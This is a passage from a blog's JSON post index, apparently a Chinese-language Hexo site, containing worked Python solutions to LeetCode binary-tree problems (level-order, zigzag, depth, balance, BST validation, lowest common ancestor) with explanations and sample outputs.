42","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】107.二叉树的层序遍历II","slug":"LeetCode-B-二叉树-107. 二叉树的层次遍历 II","date":"2020-12-06T16:00:00.000Z","updated":"2020-12-07T01:18:06.773Z","comments":true,"path":"2020/12/07/LeetCode-B-二叉树-107. 二叉树的层次遍历 II/","link":"","permalink":"https://fishni.github.io/2020/12/07/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-107.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86%20II/","excerpt":"迭代：广度优先遍历，递归：深度优先遍历","text":"迭代：广度优先遍历，递归：深度优先遍历 题目给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历） 例如： 给定二叉树 [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7返回其自底向上的层次遍历为： [ [15,7], [9,20], [3] ]题解方法一：迭代采用队列（FIFO），每层入队，统计该层结点数，每层出队完时，下一层入队。最后进行列表翻转即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# Definition for a binary tree node.from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return rootclass Solution: def levelOrder(self, root: TreeNode): if not root: return [] new_queue=Queue() list_level=[] # 初始化队列 new_queue.put(root) while not new_queue.empty(): count =new_queue.qsize() # 统计每层结点个数 tmp=[] while count: # 使每层结点都出队，并让下一层结点入队 dequeue= new_queue.get() tmp.append(dequeue.val) if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) count= count-1 list_level.append(tmp) return list_level[::-1] root = [3,9,20,None,None,15,7]root_tree=create_tree(root)a=Solution()result =a.levelOrder(root_tree)result [[15, 7], [9, 20], [3]]方法二：递归12345678910111213141516171819202122232425262728class Solution(object): def levelOrder(self, root): \"\"\" :type root: TreeNode :rtype: List[List[int]] \"\"\" if not root: return [] res = [] def dfs(index,r): # 假设res是[ [1],[2,3] ]， index是3，就再插入一个空list放到res中 if len(res)&lt;index: res.append([]) # 将当前节点的值加入到res中，index代表当前层，假设index是3，节点值是99 # res是[ [1],[2,3] [4] ]，加入后res就变为 [ [1],[2,3] [4,99] ] res[index-1].append(r.val) # 递归的处理左子树，右子树，同时将层数index+1 if r.left: dfs(index+1,r.left) if r.right: dfs(index+1,r.right) dfs(1,root) return res[::-1]root = [3,9,20,None,None,15,7]root_tree=create_tree(root)a=Solution()result =a.levelOrder(root_tree)result [[15, 7], [9, 20], [3]]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】110.平衡二叉树","slug":"LeetCode-B-二叉树-110. 平衡二叉树","date":"2020-12-05T16:00:00.000Z","updated":"2020-12-06T03:12:35.860Z","comments":true,"path":"2020/12/06/LeetCode-B-二叉树-110. 平衡二叉树/","link":"","permalink":"https://fishni.github.io/2020/12/06/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-110.%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"自顶至底先序递归；自底至顶后序递归。","text":"自顶至底先序递归；自底至顶后序递归。 题目给定一个二叉树，判断它是否是高度平衡的二叉树 本题中，一棵高度平衡二叉树定义为： 一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1 。示例 1： 3 / \\ 9 20 / \\ 15 7 输入：root = [3,9,20,null,null,15,7] 输出：true示例2： 1 / \\ 2 2 / \\ 3 3 / \\ 4 4 输入：root = [1,2,2,3,3,null,null,4,4] 输出：false示例 3： 输入：root = [] 输出：true题解1234567891011121314151617181920212223242526272829from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return root 方法一：自顶向下的递归思路 构造一个获取当前节点最大深度的方法 depth(root) ，通过比较此子树的左右子树的最大高度差abs(depth(root.left) - depth(root.right))，来判断此子树是否是二叉平衡树。若树的所有子树都平衡时，此树才平衡。 算法流程：isBalanced(root)：判断树root是否平衡 特例处理：若root为空，直接返回true 返回值：所有子树都满足平衡树性质，因此以下三者使用与逻辑&amp;&amp;连接 abs(self.depth(root.left)-self.depth(root.right))&lt;=1：判断当前子树是否平衡树 self.isBalanced(root.left)：先序遍历递归，判断当前子树的左子树是否是平衡树 self.isBalanced(root.right：先序遍历递归，判断当前子树的右子树是否是平衡树 depth(root)：计算树root的最大高度 终止条件：当root为空，即越过叶子结点，返回高度0 返回值：返回左/右子树的最大高度加1 复杂度分析 时间复杂度：$O(Nlog_2N)$：最差情况下，isBalanced(root遍历树的所有结点，占用$O(N)$；判断每个结点的最大高度depth(root需遍历各子树的所有结点，子树的结点数的复杂度为$O(log_2N)$ 空间复杂度O(N)：最差情况下（树退化为链表），系统递归所需使用O(N)的栈空间 123456789101112131415class Solution: def isBalanced(self, root: TreeNode) -&gt; bool: if not root: return True return abs(self.depth(root.left) - self.depth(root.right)) &lt;= 1 and self.isBalanced(root.left) and self.isBalanced(root.right) def depth(self, root): if not root: return 0 return max(self.depth(root.left), self.depth(root.right)) + 1root = [1,2,2,3,3,None,None,4,4]root_tree=create_tree(root)a=Solution()result =a.isBalanced(root_tree)result False方法二：从底至顶（提前阻断）此方法为本题的最优解法，但“从底至顶”的思路不易第一时间想到。 思路思路是对二叉树做先序遍历，从底至顶返回子树最大高度，若判定某子树不是平衡树则 “剪枝” ，直接向上返回。 算法流程：recur(root)： 递归返回值： 当结点root左/右子树的高度差&lt;2：返回以结点root为根结点的子树的最大高度，即结点root的左右子树中最大高度加1：（max(left,right)+1） 当结点root左/右子树的高度差$ \\geq 2$：则返回-1，代表此子树不是平衡树 递归终止条件 当越过叶子结点，返回高度0 当左右子树高度left=-1时，代表此树的左（右）子树不是平衡树，因此直接返回-1 isBalanced(root) 返回值：若$recur(root)!=-1$，则说明此树平衡返回true；否则返回false 复杂度分析时间复杂度 O(N)： N为树的节点数；最差情况下，需要递归遍历树的所有节点。 空间复杂度 O(N)： 最差情况下（树退化为链表时），系统递归需要使用 O(N) 的栈空间。 123456789101112131415161718192021class Solution: def isBalanced(self, root: TreeNode) -&gt; bool: return self.recur(root) != -1 def recur(self, root): if not root: return 0 left = self.recur(root.left) if left == -1: return -1 right = self.recur(root.right) if right == -1: return -1 return max(left, right) + 1 if abs(left - right) &lt; 2 else -1 root = [1,2,2,3,3,None,None,4,4]root_tree=create_tree(root)a=Solution()result =a.isBalanced(root_tree)result False","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】104.二叉树的最大深度","slug":"LeetCode-B-二叉树-104. 二叉树的最大深度","date":"2020-12-02T16:00:00.000Z","updated":"2020-12-07T03:33:18.507Z","comments":true,"path":"2020/12/03/LeetCode-B-二叉树-104. 二叉树的最大深度/","link":"","permalink":"https://fishni.github.io/2020/12/03/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-104.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/","excerpt":"广度优先遍历，递归：深度优先遍历","text":"广度优先遍历，递归：深度优先遍历 题目给定一个二叉树，找出其最大深度。 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。 说明: 叶子节点是指没有子节点的节点。 示例：给定二叉树 [3,9,20,null,null,15,7]， 3 / \\ 9 20 / \\ 15 7返回它的最大深度 3 。 题解1234567891011121314151617181920212223242526272829from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return root 方法一：递归法1234567891011class Solution: def maxDepth(self, root: TreeNode) -&gt; int: if root is None: return 0 left=1+self.maxDepth(root.left) right=1+self.maxDepth(root.right) if left&lt;right: return right else: return left 12345root = [1,2,3,4,None,None,5]root_tree=create_tree(root)a=Solution()result =a.maxDepth(root_tree)result 3方法二：BFS利用广度优先搜索，每次出队每一层，并进行统计 12345678910111213141516171819202122232425from collections import dequeclass Solution: def maxDepth(self, root: TreeNode): if root is None: return 0 new_deque=deque() new_deque.append(root) count=0 while len(new_deque): size=len(new_deque) while size&gt;0: cur=new_deque.popleft() if cur.left: new_deque.append(cur.left) if cur.right: new_deque.append(cur.right) size=size-1 count=count+1 return countroot = [1,2,3,4,None,None,5]root_tree=create_tree(root)a=Solution()result =a.maxDepth(root_tree)result 3","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】98.验证二叉搜索树","slug":"LeetCode-B-二叉树-98. 验证二叉搜索树","date":"2020-11-30T16:00:00.000Z","updated":"2020-12-01T01:32:41.941Z","comments":true,"path":"2020/12/01/LeetCode-B-二叉树-98. 验证二叉搜索树/","link":"","permalink":"https://fishni.github.io/2020/12/01/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-98.%20%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/","excerpt":"递归、深度优先遍历","text":"递归、深度优先遍历 题目给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。 节点的右子树只包含大于当前节点的数。 所有左子树和右子树自身必须也是二叉搜索树。 示例 1: 输入: 2 / \\ 1 3 输出: true示例2： 输入: 5 / \\ 1 4 / \\ 3 6 输出: false 解释: 输入为: [5,1,4,null,null,3,6]。 根节点的值为 5 ，但是其右子节点值为 4 。题解1234567891011121314151617181920212223242526272829from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return root 方法一：递归 思路与算法 设计一个递归函数 helper(root, lower, upper) 来递归判断，函数表示考虑以 root 为根的子树，判断子树中所有节点的值是否都在 (l,r)的范围内（注意是开区间）。如果 root 节点的值 val 不在 (l,r) 的范围内说明不满足条件直接返回，否则我们要继续递归调用检查它的左右子树是否满足，如果都满足才说明这是一棵二叉搜索树。 那么根据二叉搜索树的性质，在递归调用左子树时，我们需要把上界 upper 改为root.val，即调用helper(root.left, lower, root.val)，因为左子树里所有节点的值均小于它的根节点的值。同理递归调用右子树时，我们需要把下界 lower改为 root.val，即调用 helper(root.right, root.val, upper)。 函数递归调用的入口为 helper(root, -inf, +inf)， inf 表示一个无穷大的值。 123456789101112131415161718192021222324252627class Solution: def isValidBST(self, root): \"\"\" :type root: TreeNode :rtype: bool \"\"\" def helper(node, lower = float('-inf'), upper = float('inf')): if not node: return True val = node.val if val &lt;= lower or val &gt;= upper: return False if not helper(node.right, val, upper): return False if not helper(node.left, lower, val): return False return True return helper(root)root = [2,1,3]root_tree=create_tree(root)a=Solution()result =a.isValidBST(root_tree)result True方法二：中序遍历基于方法一中提及的性质，我们可以进一步知道二叉搜索树「中序遍历」得到的值构成的序列一定是升序的，这启示我们在中序遍历的时候实时检查当前节点的值是否大于前一个中序遍历到的节点的值即可。如果均大于说明这个序列是升序的，整棵树是二叉搜索树，否则不是，下面的代码我们使用栈来模拟中序遍历的过程。 1234567891011121314151617181920212223242526class Solution: def isValidBST(self, root): \"\"\" :type root: TreeNode :rtype: bool \"\"\" stack, inorder = [], float('-inf') while stack or root: while root: stack.append(root) root = root.left root = stack.pop() # 如果中序遍历得到的节点的值小于等于前一个 inorder，说明不是二叉搜索树 if root.val &lt;= inorder: return False inorder = root.val root = root.right return True root = [2,1,3]root_tree=create_tree(root)a=Solution()result =a.isValidBST(root_tree)result True","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】103.二叉树的锯齿形层序遍历","slug":"LeetCode-B-二叉树-103. 二叉树的锯齿形层次遍历","date":"2020-11-29T16:00:00.000Z","updated":"2020-11-30T02:56:14.145Z","comments":true,"path":"2020/11/30/LeetCode-B-二叉树-103. 二叉树的锯齿形层次遍历/","link":"","permalink":"https://fishni.github.io/2020/11/30/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-103.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%94%AF%E9%BD%BF%E5%BD%A2%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86/","excerpt":"迭代：广度优先遍历，递归：深度优先遍历","text":"迭代：广度优先遍历，递归：深度优先遍历 题目给定一个二叉树，返回其节点值的锯齿形层次遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。 例如： 给定二叉树 [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7返回锯齿形层次遍历如下： [ [3], [20,9], [15,7] ]题解方法一：BFS（广度优先遍历） 思路 最直接BFS，逐层遍历 BFS 在每层的默认顺序是从左到右，因此需要调整 BFS 算法以生成锯齿序列 最关键的是使用双端队列遍历，可以在队列的任一端插入元素。 如果需要 FIFO （先进先出）的顺序，则将新元素添加到队列尾部，后插入的元素就可以排在后面。 如果需要 FILO （先进后出）的顺序，则将新元素添加到队列首部，后插入的元素就可以排在前面。 算法 实现 BFS 的几种算法。 使用两层嵌套循环。外层循环迭代树的层级，内层循环迭代每层上的节点。 也可以使用一层循环实现 BFS。将要访问的节点添加到队列中，使用 分隔符（例如：空节点）把不同层的节点分隔开。分隔符表示一层结束和新一层开始。 这里采用第二种方法。在此算法的基础上，借助双端队列实现锯齿形顺序。在每一层，使用一个空的双端队列保存该层所有的节点。根据每一层的访问顺序，即从左到右或从右到左，决定从双端队列的哪一端插入节点。 实现从左到右的遍历顺序（FIFO）。将元素添加到队列尾部，保证后添加的节点后被访问。从上图中可以看出，输入序列 [1, 2, 3, 4, 5]，按照 FIFO 顺序得到输出序列为 [1, 2, 3, 4, 5]。 实现从右到左的遍历顺序（FILO）。将元素添加到队列头部，保证后添加的节点先被访问。输入序列 [1, 2, 3, 4, 5]，按照 FILO 顺序得到输出序列为 [5, 4, 3, 2, 1]。 1234567891011121314151617181920212223242526272829from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return root 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# Definition for a binary tree node.# class TreeNode:# def __init__(self, x):# self.val = x# self.left = None# self.right = Nonefrom collections import dequeclass Solution: def zigzagLevelOrder(self, root): \"\"\" :type root: TreeNode :rtype: List[List[int]] \"\"\" ret = [] level_list = deque() if root is None: return [] # start with the level 0 with a delimiter node_queue = deque([root, None]) is_order_left = True while len(node_queue) &gt; 0: curr_node = node_queue.popleft() if curr_node: if is_order_left: level_list.append(curr_node.val) else: level_list.appendleft(curr_node.val) if curr_node.left: node_queue.append(curr_node.left) if curr_node.right: node_queue.append(curr_node.right) else: # we finish one level ret.append(level_list) # add a delimiter to mark the level if len(node_queue) &gt; 0: node_queue.append(None) # prepare for the next level level_list = deque() is_order_left = not is_order_left return retroot = [3,9,20,None,None,15,7]root_tree=create_tree(root)a=Solution()result =a.zigzagLevelOrder(root_tree)result [deque([3]), deque([20, 9]), deque([15, 7])]注意：一种替代做法是，实现标准的 BFS 算法，得到每层节点从左到右的遍历顺序。然后按照要求 翻转 某些层节点的顺序，得到锯齿形的遍历结果。 方法二：DFS （深度优先遍历） 思路 也可以使用 DFS 实现 BFS 的遍历顺序。 在 DFS 遍历期间，将结果保存在按层数索引的全局数组中。即元素 array[level] 存储同一层的所有节点。然后在 DFS 的每一步更新全局数组 与改进的 BFS 算法类似，使用双端队列保存同一层的所有节点，并交替插入方向（从首部插入或从尾部插入）得到需要的输出顺序。 算法 使用递归实现 DFS 算法。定义一个递归方法 DFS(node, level)，方法参数为当前节点 node 和指定层数 level。该方法共执行三个步骤： 如果是第一次访问该层的节点，即该层的双端队列不存在。那么创建一个双端队列，并添加该节点到队列中。 如果当前层的双端队列已存在，根据顺序，将当前节点插入队列头部或尾部。 最后，为每个节点调用该递归方法。 1234567891011121314151617181920212223242526272829303132333435from collections import dequeclass Solution: def zigzagLevelOrder(self, root): \"\"\" :type root: TreeNode :rtype: List[List[int]] \"\"\" if root is None: return [] results = [] def dfs(node, level): if level &gt;= len(results): results.append(deque([node.val])) else: if level % 2 == 0: results[level].append(node.val) else: results[level].appendleft(node.val) for next_node in [node.left, node.right]: if next_node is not None: dfs(next_node, level+1) # normal level order traversal with DFS dfs(root, 0) return results root = [3,9,20,None,None,15,7,6]root_tree=create_tree(root)a=Solution()result =a.zigzagLevelOrder(root_tree)result [deque([3]), deque([20, 9]), deque([15, 7]), deque([6])]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】102.二叉树的层序遍历","slug":"LeetCode-B-二叉树-102. 二叉树的层序遍历","date":"2020-11-25T16:00:00.000Z","updated":"2020-11-26T02:48:07.613Z","comments":true,"path":"2020/11/26/LeetCode-B-二叉树-102. 二叉树的层序遍历/","link":"","permalink":"https://fishni.github.io/2020/11/26/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-102.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/","excerpt":"迭代：广度优先遍历，递归：深度优先遍历","text":"迭代：广度优先遍历，递归：深度优先遍历 题目给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。 示例： 二叉树：[3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7返回其层次遍历结果： [ [3], [9,20], [15,7] ]题解方法一：迭代，广度优先变遍历 算法与思路分析 采用队列（FIFO），每层入队，统计该层结点数，每层出队完时，下一层入队。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# Definition for a binary tree node.from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return rootclass Solution: def levelOrder(self, root: TreeNode): if not root: return None new_queue=Queue() list_level=[] # 初始化队列 new_queue.put(root) while not new_queue.empty(): count =new_queue.qsize() # 统计每层结点个数 tmp=[] while count: # 使每层结点都出队，并让下一层结点入队 dequeue= new_queue.get() tmp.append(dequeue.val) if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) count= count-1 list_level.append(tmp) return list_level root = [3,9,20,None,None,15,7]root_tree=create_tree(root)a=Solution()result =a.levelOrder(root_tree)result [[3], [9, 20], [15, 7]]时间复杂度： O(n) 空间复杂度：O(n) 方法二：递归，深度优先遍历广度优先处理切割很明显，如图按每层进行切割 深度优先处理时，先调整二叉树形态，如下，田字型每一行为每一层对应结点 按照深度优先的处理顺序，会先访问节点 1，再访问节点 2，接着是节点 3。之后是第二列的 4 和 5，最后是第三列的 6。 每次递归的时候都需要带一个 index(表示当前的层数)，也就对应那个田字格子中的第几行，如果当前行对应的 list 不存在，就加入一个空 list 进去。 动态演示如下: 时间复杂度：O(N) 空间复杂度：O(h)，h 是树的高度 12345678910111213141516171819202122232425262728class Solution(object): def levelOrder(self, root): \"\"\" :type root: TreeNode :rtype: List[List[int]] \"\"\" if not root: return [] res = [] def dfs(index,r): # 假设res是[ [1],[2,3] ]， index是3，就再插入一个空list放到res中 if len(res)&lt;index: res.append([]) # 将当前节点的值加入到res中，index代表当前层，假设index是3，节点值是99 # res是[ [1],[2,3] [4] ]，加入后res就变为 [ [1],[2,3] [4,99] ] res[index-1].append(r.val) # 递归的处理左子树，右子树，同时将层数index+1 if r.left: dfs(index+1,r.left) if r.right: dfs(index+1,r.right) dfs(1,root) return resroot = [3,9,20,None,None,15,7]root_tree=create_tree(root)a=Solution()result =a.levelOrder(root_tree)result [[3], [9, 20], [15, 7]]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】236.二叉树的最近公共祖先","slug":"LeetCode-B-二叉树-236. 二叉树的最近公共祖先","date":"2020-11-22T16:00:00.000Z","updated":"2020-11-23T09:25:30.513Z","comments":true,"path":"2020/11/23/LeetCode-B-二叉树-236. 二叉树的最近公共祖先/","link":"","permalink":"https://fishni.github.io/2020/11/23/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-236.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/","excerpt":"二叉树创建，最近公共祖先","text":"二叉树创建，最近公共祖先 题目给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。 最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉树: root = [3,5,1,6,2,0,8,null,null,7,4] 示例 1: 输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1 输出: 3 解释: 节点 5 和节点 1 的最近公共祖先是节点 3。示例 2: 输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4 输出: 5 解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。说明: 所有节点的值都是唯一的。 p、q 为不同节点且均存在于给定的二叉树中。题解 最近公共祖先的定义： 设节点 root为节点 p, q的某公共祖先，若其左子节点 root.left 和右子节点 root.right都不是 p,q的公共祖先，则称 root 是 “最近的公共祖先” 。 根据以上定义，若 rootroot 是 p, qp,q 的 最近公共祖先 ，则只可能为以下情况之一： p 和 q 在 root 的子树中，且分列root 的 异侧（即分别在左、右子树中）； p = root ，且q 在 root 的左或右子树中； q = root ，且 p 在 root的左或右子树中； 考虑通过递归对二叉树进行后序遍历，当遇到节点 p 或 q 时返回。从底至顶回溯，当节点 p, q在节点 root的异侧时，节点root 即为最近公共祖先，则向上返回 root 。 递归解析： 终止条件： 当越过叶节点，则直接返回 null ； 当 root 等于 p,q，则直接返回 root； 递推工作： 开启递归左子节点，返回值记为 left ； 开启递归右子节点，返回值记为 right ； 返回值： 根据 left和 right ，可展开为四种情况； 1.当 left 和 right 同时为空 ：说明root 的左 / 右子树中都不包含 p,q ，返回null ； 2.当 left和 right 同时不为空 ：说明 p, q分列在 root 的 异侧 （分别在 左 / 右子树），因此 root 为最近公共祖先，返回 root ； 3.当 left 为空 ，right 不为空 ：p,q 都不在 root 的左子树中，直接返回 right 。具体可分为两种情况： p,q 其中一个在root 的 右子树 中，此时right 指向 p（假设为p ）； p,q 两节点都在 root 的 右子树 中，此时的right 指向 最近公共祖先节点 ； 4.当 left 不为空 ，right 为空 ：与情况 3. 同理； 观察发现， 情况 1. 